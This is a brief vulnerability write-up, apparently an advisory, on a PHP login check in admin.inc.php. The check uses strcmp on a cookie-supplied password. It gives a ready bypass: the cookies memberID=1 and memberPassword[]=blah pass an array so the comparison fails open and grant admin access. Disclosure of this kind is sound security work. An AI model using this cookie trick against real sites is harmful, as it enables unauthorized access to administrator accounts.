File: admin.inc.php
Line: 187
Code: (strcmp($aProfile[&#039;Password&#039;], $passwd) != 0)
  
$passwd is equal to Cookie parameter memberpassword
  
Bug:
According to PHP documentation strcmp will compare strings, but what if we provide an array???
  
So, simple bypass is to put two cookies in browser
memberID=1
memberPassword[]=blah --->array
  
This will allow the attacker to bypass the authentication and can also enter in admin panel.
